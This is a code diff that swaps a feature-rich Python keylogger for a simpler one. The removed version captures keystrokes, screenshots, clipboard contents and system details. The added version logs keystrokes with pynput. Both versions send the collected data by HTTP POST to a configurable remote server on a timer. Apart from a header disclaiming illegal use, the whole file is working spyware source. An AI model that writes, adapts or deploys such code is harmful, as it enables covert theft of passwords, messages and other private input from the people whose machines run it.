@@ -1,131 +1,63 @@
+"""
+----------------------------------------------------
+This project is owned by GiraSec Solutions!
+Never use it for illegal actions!!
+* Monstaboard 2024
+----------------------------------------------------
+"""
+
+from pynput import keyboard
+import requests
 import json
 import threading
-import socket
-import os
-import time
-import pyperclip
-from pynput import keyboard
-from PIL import ImageGrab
-import requests
 
-# Global variables
-data_buffer = {"keystrokes": [], "screenshot": None, "system_info": None, "clipboard_content": None}
-config = {
-    "server_ip": "<ip>",
-    "server_port": "<port>",
-    "send_interval": 30,
-    "screenshot_interval": 300,
-    "capture_clipboard": True
-}
+# Variable to store keystrokes
+keystrokes = ""
 
-# Load configuration from a file
-def load_config():
-    try:
-        with open('config.json', 'r') as f:
-            return json.load(f)
-    except FileNotFoundError:
-        return config
-    except Exception as e:
-        print(f"Error loading config file: {e}")
-        return config
+# Server IP address and port number
+server_ip = "<ip>"
+server_port = "<port>"
 
-# Send data to the server
+# Time interval for sending data
+send_interval = 10
+
 def send_data_to_server():
-    global data_buffer
+    """
+    Sends the collected keystrokes to the server at regular intervals.
+    """
     try:
-        r = requests.post(
-            f"http://{config['server_ip']}:{config['server_port']}",
-            json=data_buffer,
-            headers={"Content-Type": "application/json"}
-        )
-        r.raise_for_status()  # Raise error if request fails
-        data_buffer = {"keystrokes": [], "screenshot": None, "system_info": None, "clipboard_content": None}
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to send data to server: {e}")
+        payload = json.dumps({"keyboardData": keystrokes})
+        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
+        
+        # Set up the next call to this function
+        timer = threading.Timer(send_interval, send_data_to_server)
+        timer.start()
+    except:
+        print("Couldn't complete request!")
 
-    # Set up the next call to this function
-    timer = threading.Timer(config['send_interval'], send_data_to_server)
-    timer.daemon = True  # Daemonize the thread
-    timer.start()
-
-# Capture screenshot
-def capture_screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        screenshot_path = "screenshot.jpg"
-        screenshot.save(screenshot_path)
-        data_buffer["screenshot"] = screenshot_path
-    except Exception as e:
-        print(f"Error capturing screenshot: {e}")
-
-# Capture system information
-def capture_system_info():
-    try:
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        username = os.getlogin()
-        system_info = {
-            "hostname": hostname,
-            "ip_address": ip_address,
-            "username": username
-        }
-        data_buffer["system_info"] = system_info
-    except Exception as e:
-        print(f"Error capturing system information: {e}")
-
-# Capture clipboard content changes
-def capture_clipboard():
-    try:
-        previous_clipboard = ""
-        while True:
-            clipboard_content = pyperclip.paste()
-            if clipboard_content != previous_clipboard:
-                data_buffer["clipboard_content"] = clipboard_content
-                previous_clipboard = clipboard_content
-            time.sleep(1)
-    except Exception as e:
-        print(f"Error capturing clipboard content: {e}")
-
-# Handle key press events
 def handle_key_press(key):
-    global data_buffer
-    try:
-        if hasattr(key, 'char'):
-            data_buffer["keystrokes"].append(key.char)
-        else:
-            data_buffer["keystrokes"].append(str(key))
-    except Exception as e:
-        print(f"Error handling key press: {e}")
+    """
+    Handles the key press events and updates the keystrokes variable.
+    """
+    global keystrokes
 
-# Main function
-def main():
-    global config
-    config = load_config()
+    if key == keyboard.Key.enter:
+        keystrokes += "\n"
+    elif key == keyboard.Key.tab:
+        keystrokes += "\t"
+    elif key == keyboard.Key.space:
+        keystrokes += " "
+    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+        pass
+    elif key == keyboard.Key.backspace:
+        if len(keystrokes) > 0:
+            keystrokes = keystrokes[:-1]
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        keystrokes += str(key).strip("'")
 
-    # Start the keyboard listener
-    keyboard_listener = keyboard.Listener(on_press=handle_key_press)
-    keyboard_listener.start()
-
-    # Start sending data to the server
+# Start the keyboard listener and initiate sending data to the server
+with keyboard.Listener(on_press=handle_key_press) as listener:
     send_data_to_server()
-
-    # Start capturing system information
-    capture_system_info_thread = threading.Thread(target=capture_system_info)
-    capture_system_info_thread.daemon = True
-    capture_system_info_thread.start()
-
-    # Start capturing screenshot
-    capture_screenshot_thread = threading.Thread(target=capture_screenshot)
-    capture_screenshot_thread.daemon = True
-    capture_screenshot_thread.start()
-
-    # Start capturing clipboard content
-    if config.get("capture_clipboard", False):
-        capture_clipboard_thread = threading.Thread(target=capture_clipboard)
-        capture_clipboard_thread.daemon = True
-        capture_clipboard_thread.start()
-
-    keyboard_listener.join()
-
-if __name__ == "__main__":
-    main()
+    listener.join()
